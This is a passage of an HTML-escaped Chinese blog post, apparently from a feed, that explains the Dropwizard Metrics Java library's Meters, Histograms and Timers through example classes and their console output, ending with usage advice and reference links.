addJob(job);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;add job : &quot;&lt;/span&gt;+job);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            num++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行之后的结果大致如下：&lt;br&gt;&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;add &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;job &lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;Job-15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;add &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;job &lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;Job-16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;take &lt;span class=&quot;keyword&quot;&gt;job &lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;Job-8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;take &lt;span class=&quot;keyword&quot;&gt;job &lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;Job-10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;add &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;job &lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;Job-19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;-8-1 &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;31&lt;/span&gt; ============================================&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-- Counters ----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;java.util.Queue.pending-jobs.size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;             &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Meters&quot;&gt;&lt;a href=&quot;#Meters&quot; class=&quot;headerlink&quot; title=&quot;Meters&quot;&gt;&lt;/a&gt;Meters&lt;/h3&gt;&lt;p&gt;Meter度量一系列事件发生的速率(rate)，例如TPS。Meters会统计最近1分钟，5分钟，15分钟，还有全部时间的速率。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MeterTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Random random = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Random();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Meter meter)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;request&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        meter.mark();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Meter meter, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(n &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            request(meter);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n--;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InterruptedException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reporter.start(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, TimeUnit.SECONDS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,&lt;span class=&quot;string&quot;&gt;&quot;request&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;tps&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            request(meterTps,random.nextInt(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Thread.sleep(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行结果大致如下：&lt;br&gt;&lt;figure class=&quot;highlight vbscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;request&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;-8&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;25&lt;/span&gt; ============================================&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-- Meters ------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;com.alibaba.wuchong.metrics.MeterTest.&lt;span class=&quot;built_in&quot;&gt;request&lt;/span&gt;.tps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             count = &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         mean rate = &lt;span class=&quot;number&quot;&gt;2.13&lt;/span&gt; events/&lt;span class=&quot;built_in&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;-&lt;span class=&quot;built_in&quot;&gt;minute&lt;/span&gt; rate = &lt;span class=&quot;number&quot;&gt;2.52&lt;/span&gt; events/&lt;span class=&quot;built_in&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;-&lt;span class=&quot;built_in&quot;&gt;minute&lt;/span&gt; rate = &lt;span class=&quot;number&quot;&gt;3.16&lt;/span&gt; events/&lt;span class=&quot;built_in&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;-&lt;span class=&quot;built_in&quot;&gt;minute&lt;/span&gt; rate = &lt;span class=&quot;number&quot;&gt;3.32&lt;/span&gt; events/&lt;span class=&quot;built_in&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：非常像 Unix 系统中 uptime 和 top 中的 load。&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;Histograms&quot;&gt;&lt;a href=&quot;#Histograms&quot; class=&quot;headerlink&quot; title=&quot;Histograms&quot;&gt;&lt;/a&gt;Histograms&lt;/h3&gt;&lt;p&gt;Histogram统计数据的分布情况。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, 和 99.9百分位的值(percentiles)。&lt;/p&gt;
&lt;p&gt;比如request的大小的分布：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HistogramTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Random random = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Random();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InterruptedException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reporter.start(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, TimeUnit.SECONDS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Histogram histogram = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Histogram(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ExponentiallyDecayingReservoir());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        registry.register(MetricRegistry.name(HistogramTest.class, &lt;span class=&quot;string&quot;&gt;&quot;request&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;histogram&quot;&lt;/span&gt;), histogram);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Thread.sleep(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            histogram.update(random.nextInt(&lt;span class=&quot;number&quot;&gt;100000&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行之后结果大致如下：&lt;br&gt;&lt;figure class=&quot;highlight dns&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-- Histograms --------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;java.util.Queue.queue.histogram&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             count = &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               min = &lt;span class=&quot;number&quot;&gt;1122&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               max = &lt;span class=&quot;number&quot;&gt;99650&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              mean = &lt;span class=&quot;number&quot;&gt;48735.12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            stddev = &lt;span class=&quot;number&quot;&gt;28609.02&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            median = &lt;span class=&quot;number&quot;&gt;49493.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;72323.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;90773.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;94011.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;99650.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;99650.00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Timers&quot;&gt;&lt;a href=&quot;#Timers&quot; class=&quot;headerlink&quot; title=&quot;Timers&quot;&gt;&lt;/a&gt;Timers&lt;/h3&gt;&lt;p&gt;Timer其实是 Histogram 和 Meter 的结合， histogram 某部分代码/调用的耗时， meter统计TPS。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;TimerTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Random random = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Random();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InterruptedException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reporter.start(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, TimeUnit.SECONDS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,&lt;span class=&quot;string&quot;&gt;&quot;get-latency&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Timer.Context ctx;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ctx = timer.time();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Thread.sleep(random.nextInt(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ctx.stop();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行之后结果如下：&lt;br&gt;&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- Timers ------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;com.alibaba.wuchong.metrics.TimerTest.&lt;span class=&quot;built_in&quot;&gt;get&lt;/span&gt;-latency&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             count = &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         mean rate = &lt;span class=&quot;number&quot;&gt;1.90&lt;/span&gt; calls/&lt;span class=&quot;keyword&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;-minute rate = &lt;span class=&quot;number&quot;&gt;1.66&lt;/span&gt; calls/&lt;span class=&quot;keyword&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;-minute rate = &lt;span class=&quot;number&quot;&gt;1.61&lt;/span&gt; calls/&lt;span class=&quot;keyword&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;-minute rate = &lt;span class=&quot;number&quot;&gt;1.60&lt;/span&gt; calls/&lt;span class=&quot;keyword&quot;&gt;second&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;13.90&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;988.71&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              mean = &lt;span class=&quot;number&quot;&gt;519.21&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            stddev = &lt;span class=&quot;number&quot;&gt;286.23&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;median&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;553.84&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;763.64&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;943.27&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;988.71&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;988.71&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;number&quot;&gt;99.9&lt;/span&gt;% &amp;lt;= &lt;span class=&quot;number&quot;&gt;988.71&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;milliseconds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h2&gt;&lt;p&gt;初次之外，Metrics还提供了 &lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/healthchecks/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HealthCheck&lt;/a&gt; 用来检测某个某个系统是否健康，例如数据库连接是否正常。还有&lt;a href=&quot;https://dropwizard.github.io/metrics/3.1.0/apidocs/com/codahale/metrics/annotation/package-tree.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Metrics Annotation&lt;/a&gt;，可以很方便地实现统计某个方法，某个值的数据。感兴趣的可以点进链接看看。&lt;/p&gt;
&lt;h2 id=&quot;使用经验总结&quot;&gt;&lt;a href=&quot;#使用经验总结&quot; class=&quot;headerlink&quot; title=&quot;使用经验总结&quot;&gt;&lt;/a&gt;使用经验总结&lt;/h2&gt;&lt;p&gt;一般情况下，当我们需要统计某个函数被调用的频率（TPS），会使用Meters。当我们需要统计某个函数的执行耗时时，会使用Histograms。当我们既要统计TPS又要统计耗时时，我们会使用Timers。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/core/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Metrics Core&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/getting-started/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Metrics Getting Started&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文代码已上传至&lt;a href=&quot;https://github.com/wuchong/metrics-demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;。&lt;/p&gt;
</content>
    
    <summary type="html">
